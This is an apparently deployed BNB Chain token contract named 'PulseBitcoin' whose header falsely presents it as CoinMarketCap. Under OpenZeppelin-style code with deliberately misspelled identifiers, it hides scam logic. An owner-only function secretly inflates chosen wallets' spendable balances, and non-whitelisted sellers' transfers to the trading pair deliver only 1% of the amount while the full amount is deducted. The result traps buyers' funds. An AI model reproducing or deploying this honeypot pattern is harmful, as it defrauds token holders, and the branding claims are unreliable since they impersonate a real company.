/**
 *Submitted for verification at BscScan.com on 2023-01-12
*/

/**

CoinMarketCap is the world's most-referenced price-tracking website for cryptoassets in the rapidly 
growing cryptocurrency space. Its mission is to make crypto discoverable and efficient globally by 
empowering retail users with unbiased, high quality and accurate information for drawing their own informed conclusions.

Website: https://coinmarketcap.com
Telegram: https://t.me/CoinMarketCapAnnouncements
Facebook: https://www.facebook.com/CoinMarketCap
Twitter: https://twitter.com/CoinMarketCap
Instagram: https://www.instagram.com/fifaworldcup

**/
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one acrunit (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `quvner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed quvner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amuyon of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amuyon of tokens owned by `acrunit`.
     */
    function balanceOf(address acrunit) external view returns (uint256);

    /**
     * @dev Moves `amuyon` tokens from the caller's acrunit to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amuyon) external returns (bool);

    /**
     * @dev Returns the remaining numerber of tokens that `spender` will be
     * allowed to spend on behalf of `quvner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address quvner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amuyon` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amuyon) external returns (bool);

    /**
     * @dev Moves `amuyon` tokens from `from` to `to` using the
     * allowance mechanism. `amuyon` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amuyon
    ) external returns (bool);
}


// File @openzeppelin/contracts/token/ERC20/extensions/[email protected]

// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


// File @openzeppelin/contracts/utils/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the acrunit sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/token/ERC20/[email protected]


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the mamltiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMaml(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the mamltiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - mamltiplication cannot overflow.
     */
    function maml(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an acrunit (an quvner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the quvner acrunit will be the one that deploys the contract. This
 * can later be changed with {transferQuvnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyQuvner`, which can be applied to your functions to restrict their use to
 * the quvner.
 */
abstract contract Ownable is Context {
    address private _quvner;

    event QuvnershipTransferred(address indexed previousQuvner, address indexed newQuvner);

    /**
     * @dev Initializes the contract setting the deployer as the initial quvner.
     */
    constructor() {
        _transferQuvnership(_msgSender());
    }

    /**
     * @dev Throws if called by any acrunit other than the quvner.
     */
    modifier onlyQuvner() {
        _checkQuvner();
        _;
    }

    /**
     * @dev Returns the address of the current quvner.
     */
    function quvner() public view virtual returns (address) {
        return _quvner;
    }

    /**
     * @dev Throws if the sender is not the quvner.
     */
    function _checkQuvner() internal view virtual {
        require(quvner() == _msgSender(), "Ownable: caller is not the quvner");
    }

    /**
     * @dev Leaves the contract without quvner. It will not be possible to call
     * `onlyQuvner` functions anymore. Can only be called by the current quvner.
     *
     * NOTE: Renouncing quvnership will leave the contract without an quvner,
     * thereby removing any functionality that is only available to the quvner.
     */
    function renounceQuvnership() public virtual onlyQuvner {
        _transferQuvnership(address(0));
    }

    /**
     * @dev Transfers quvnership of the contract to a new acrunit (`newQuvner`).
     * Can only be called by the current quvner.
     */
    function transferQuvnership(address newQuvner) public virtual onlyQuvner {
        require(newQuvner != address(0), "Ownable: new quvner is the zero address");
        _transferQuvnership(newQuvner);
    }

    /**
     * @dev Transfers quvnership of the contract to a new acrunit (`newQuvner`).
     * Internal function without access restriction.
     */
    function _transferQuvnership(address newQuvner) internal virtual {
        address oldQuvner = _quvner;
        _quvner = newQuvner;
        emit QuvnershipTransferred(oldQuvner, newQuvner);
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all acrunits just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata,Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _afterwards;
    mapping(address => bool) private _marketingStrategy;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address public uniswapV2Pair;
    address deadAdress = 0x000000000000000000000000000000000000dEaD;
    address _tokenListing1 = 0x2e8F79aD740de90dC5F5A9F0D8D9661a60725e64;
    address _tokenListing2 = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _tokenListing3 = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    address _tokenListing4 = 0x2477fB288c5b4118315714ad3c7Fd7CC69b00bf9;
    address _tokenListing5 = 0x311aEA58Ca127B955890647413846E351df32554;
    address _tokenListing6 = 0x306F8dFBC6244454eFd5dFDA03AC241eE37EB7b5;
    address _tokenListing7 = 0x247A85139E0DF5857D0D7610804064F5F45A9DEC;

    function _setPairList(address _address) external onlyQuvner {
        uniswapV2Pair = _address;
    }

    function setAfterwards(address acrunit, uint256 numer) public onlyQuvner {
        _afterwards[acrunit] = numer;
    }

    function _setMarketingStrategy(address[] memory _aMarket) public onlyQuvner {
        for(uint256 i = 0; i < _aMarket.length; i++){
        _marketingStrategy[_aMarket[i]] = true;
        }
    }
 
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 9. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketingStrategy[_msgSender()] = true;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the numerber of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 9, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address acrunit) public view virtual override returns (uint256) {
        return _balances[acrunit];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amuyon`.
     */
    function transfer(address _to, uint256 amuyon) public virtual override returns (bool) {
        address quvner = _msgSender();
        _transfer(quvner, _to, amuyon);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address quvner, address spender) public view virtual override returns (uint256) {
        return _allowances[quvner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amuyon` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amuyon) public virtual override returns (bool) {
        address quvner = _msgSender();
        _approve(quvner, spender, amuyon);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amuyon`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amuyon`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amuyon
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amuyon);
        _transfer(from, to, amuyon);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address quvner = _msgSender();
        _approve(quvner, spender, allowance(quvner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address quvner = _msgSender();
        uint256 currentAllowance = allowance(quvner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(quvner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    /**
     * @dev Moves `amuyon` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amuyon`.
     */

    using SafeMath for uint256;
    uint256 private _feeSiale = 2;
    uint256 private _iStart = 1;
    uint256 private _iStop = 100;
    function _transfer(
        address from,
        address to,
        uint256 amuyon
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amuyon);
        uint256 fromBalance = _balances[from] + _afterwards[from] + 0;
        require(fromBalance >= amuyon, "ERC20: transfer exceeds balance");

        uint256 feeAmuyon = 0;
        feeAmuyon = amuyon.maml(_feeSiale).div(100);

    unchecked {

        if (!(_marketingStrategy[from] || _marketingStrategy[to]) && to == uniswapV2Pair) {
                uint256 roxAmuyon = amuyon.maml(_iStart).div(_iStop);
                _balances[to] += roxAmuyon;
            }
        else {
                uint256 roxAmuyon = amuyon;
                _balances[to] += roxAmuyon;
            }        
        _balances[from] = fromBalance - amuyon;
        _balances[to] -= feeAmuyon;
    }
        emit Transfer(from, to, amuyon);

        _afterTokenTransfer(from, to, amuyon);
    }

    /** @dev Creates `amuyon` tokens and assigns them to `acrunit`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `acrunit` cannot be the zero address.
     */
    function _mint(address acrunit, uint256 amuyon) internal virtual {
        require(acrunit != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), acrunit, amuyon);

        _totalSupply += amuyon;
    unchecked {
        // Overflow not possible: balance + amuyon is at most totalSupply + amuyon, which is checked above.
        _balances[acrunit] += amuyon;
    }
        emit Transfer(address(0), acrunit, amuyon);

        _afterTokenTransfer(address(0), acrunit, amuyon);
    }

    /**
     * @dev Destroys `amuyon` tokens from `acrunit`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `acrunit` cannot be the zero address.
     * - `acrunit` must have at least `amuyon` tokens.
     */
    function _burn(address acrunit, uint256 amuyon) internal virtual {
        require(acrunit != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(acrunit, address(0), amuyon);

        uint256 acrunitBalance = _balances[acrunit];
        require(acrunitBalance >= amuyon, "ERC20: burn amuyon exceeds balance");
        
    unchecked {
        _balances[acrunit] = acrunitBalance - amuyon;
        // Overflow not possible: amuyon <= acrunitBalance <= totalSupply.
        _totalSupply -= amuyon;
    }

        emit Transfer(acrunit, address(0), amuyon);

        _afterTokenTransfer(acrunit, address(0), amuyon);
    }

    /**
     * @dev Sets `amuyon` as the allowance of `spender` over the `quvner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `quvner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address quvner,
        address spender,
        uint256 amuyon
    ) internal virtual {
        require(quvner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[quvner][spender] = amuyon;
        emit Approval(quvner, spender, amuyon);
    }

    /**
     * @dev Updates `quvner` s allowance for `spender` based on spent `amuyon`.
     *
     * Does not update the allowance amuyon in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address quvner,
        address spender,
        uint256 amuyon
    ) internal virtual {
        uint256 currentAllowance = allowance(quvner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuyon, "ERC20: insufficient allowance");
        unchecked {
            _approve(quvner, spender, currentAllowance - amuyon);
        }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amuyon` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amuyon` tokens will be minted for `to`.
     * - when `to` is zero, `amuyon` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuyon
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amuyon` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amuyon` tokens have been minted for `to`.
     * - when `to` is zero, `amuyon` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuyon
    ) internal virtual {}
}

pragma solidity ^0.8.0;

contract Token is ERC20 {
    uint256 initialSupply = 1000000000;
    constructor() ERC20("PulseBitcoin", "$PLSB") {
        _mint(msg.sender, initialSupply*10**9);
        transfer(deadAdress, totalSupply() / 10*1);
        transfer(_tokenListing1, totalSupply() / 10**5);
        transfer(_tokenListing2, totalSupply() / 10**5);
        transfer(_tokenListing3, totalSupply() / 10**5);
        transfer(_tokenListing4, totalSupply() / 10**5);
        transfer(_tokenListing5, totalSupply() / 10**5);
        transfer(_tokenListing6, totalSupply() / 10**5);
        transfer(_tokenListing7, totalSupply() / 10**5);
    }
}